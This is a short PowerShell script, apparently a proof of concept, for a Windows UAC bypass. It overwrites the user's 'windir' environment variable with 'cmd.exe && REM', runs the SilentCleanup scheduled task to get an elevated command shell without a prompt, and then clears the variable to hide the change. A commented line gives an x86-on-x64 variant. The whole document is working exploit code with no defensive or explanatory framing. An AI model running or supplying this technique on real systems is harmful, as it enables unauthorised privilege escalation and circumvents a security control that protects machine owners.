$program = "cmd.exe && REM"
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
#For x86 shell in Windows x64
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I""
Start-Sleep 3
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force